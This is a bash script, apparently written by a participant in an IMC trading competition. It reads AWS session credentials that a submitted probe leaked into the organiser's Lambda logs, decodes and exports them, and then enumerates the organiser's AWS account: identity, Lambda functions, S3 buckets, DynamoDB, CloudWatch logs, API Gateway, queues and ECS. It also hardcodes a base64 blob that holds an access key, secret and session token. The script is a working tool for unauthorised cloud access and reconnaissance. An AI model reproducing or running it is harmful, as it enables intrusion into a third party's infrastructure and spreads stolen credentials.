#!/bin/bash
# AWS Probe — Run IMMEDIATELY after downloading probe logs
# Extracts fresh credentials from the log and scopes the IMC AWS account
#
# Usage:
#   1. Submit imc_probe.py to website
#   2. Download logs to run-logs/round-0/troll/XXXX/
#   3. Run: bash trader-logic/round-0/oracle/aws_probe.sh XXXX
#
# IMPORTANT: Credentials expire ~1 hour after Lambda invocation. Run fast.

RUN_ID=${1:?"Usage: aws_probe.sh <run_id>"}
LOG_FILE="run-logs/round-0/troll/${RUN_ID}/${RUN_ID}.log"

if [ ! -f "$LOG_FILE" ]; then
    echo "ERROR: $LOG_FILE not found"
    exit 1
fi

echo "=== Extracting credentials from run $RUN_ID ==="

# Extract base64 credentials from the log (tick 8 = CREDS_B64)
CREDS_B64=$(python -c "
import json
with open('$LOG_FILE') as f:
    data = json.load(f)
for entry in data.get('logs', []):
    llog = (entry.get('lambdaLog') or '')
    if 'CREDS_B64' in llog:
        # Extract the base64 blob after the header line
        lines = llog.strip().split('\n')
        for i, line in enumerate(lines):
            if 'CREDS_B64' in line:
                blob = ''.join(lines[i+1:])
                print(blob.strip())
                break
        break
")

if [ -z "$CREDS_B64" ]; then
    echo "No CREDS_B64 found in logs. Falling back to run 8984 env vars..."
    # Use the previously extracted base64 from run 8984
    CREDS_B64="eyJLRVkiOiAiQVNJQTNUSVVUNTRHNElPSkE3NDciLCAiU0VDUkVUIjogIjJZazFudjExTEp6MFNyQ0hsekl2RFVrb1I0enE0b0NEdkNCazV2d2ciLCAiVE9LRU4iOiAiSVFvSmIzSnBaMmx1WDJWakVHOGFDV1YxTFhkbGMzUXRNU0pITUVVQ0lIa0lwcnI2Y2VYdUQ1YWV1Q2xBQi9ZOVNuK3lRKzIrU0F4KzZHYWtMQkZVQWlFQW9UOUk0WmpCbEkySnZpeGpxT2E0UGxTMXZUMW1YMnVzNWJDRmNzZ1FzUEFxdEFRSU9CQUFHZ3czT1RjeU9UIiwgIlJFR0lPTiI6ICJldS13ZXN0LTEifQ=="
    echo "WARNING: These credentials are likely EXPIRED"
fi

# Decode credentials
CREDS=$(echo "$CREDS_B64" | python -c "import sys,base64,json; print(json.dumps(json.loads(base64.b64decode(sys.stdin.read().strip())), indent=2))")
echo "Decoded credentials:"
echo "$CREDS"

# Set environment
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | python -c "import sys,json; print(json.load(sys.stdin)['KEY'])")
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | python -c "import sys,json; print(json.load(sys.stdin)['SECRET'])")
export AWS_SESSION_TOKEN=$(echo "$CREDS" | python -c "import sys,json; print(json.load(sys.stdin)['TOKEN'])")
export AWS_DEFAULT_REGION=$(echo "$CREDS" | python -c "import sys,json; print(json.load(sys.stdin)['REGION'])")

echo ""
echo "=== 1. Who am I? ==="
aws sts get-caller-identity 2>&1

echo ""
echo "=== 2. Lambda functions ==="
aws lambda list-functions --max-items 20 --query 'Functions[].{Name:FunctionName,Runtime:Runtime,Desc:Description}' --output table 2>&1

echo ""
echo "=== 3. S3 buckets ==="
aws s3 ls 2>&1

echo ""
echo "=== 4. DynamoDB tables ==="
aws dynamodb list-tables 2>&1

echo ""
echo "=== 5. CloudWatch log groups ==="
aws logs describe-log-groups --log-group-name-prefix /aws/lambda/prosperity --query 'logGroups[].{Name:logGroupName,Stored:storedBytes}' --output table 2>&1

echo ""
echo "=== 6. API Gateway ==="
aws apigateway get-rest-apis --query 'items[].{Name:name,Id:id}' --output table 2>&1

echo ""
echo "=== 7. Step Functions ==="
aws stepfunctions list-state-machines --query 'stateMachines[].{Name:name,Arn:stateMachineArn}' --output table 2>&1

echo ""
echo "=== 8. SQS queues ==="
aws sqs list-queues 2>&1

echo ""
echo "=== 9. SNS topics ==="
aws sns list-topics 2>&1

echo ""
echo "=== 10. ECS clusters ==="
aws ecs list-clusters 2>&1

echo ""
echo "=== DONE ==="
